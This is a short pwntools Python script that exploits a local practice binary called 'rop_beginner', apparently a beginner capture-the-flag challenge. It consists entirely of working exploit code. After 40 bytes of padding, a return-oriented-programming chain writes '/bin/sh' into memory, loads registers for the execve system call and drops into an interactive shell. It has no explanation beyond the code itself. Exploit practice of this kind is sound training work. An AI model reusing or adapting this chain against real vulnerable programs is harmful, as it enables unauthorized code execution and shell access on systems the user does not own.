from pwn import *

p = process("./rop_beginner")

pop_rdi = 0x0000000000401693
pop_rsi = 0x00000000004017a7
pop_rdx = 0x0000000000437045
mov_rdi_rcx = 0x0000000000422428
pop_rcx = 0x00000000004b7f07
pop_rax = 0x000000000044d0f4
syscall = 0x0000000000400488
bss = 0x006c2000-0x100

payload = b'a'*40
payload += p64(pop_rcx)
payload += b'/bin/sh\x00'
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(mov_rdi_rcx)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(59)
payload += p64(syscall)
#attach(p)
p.sendafter(':', payload)

p.interactive()
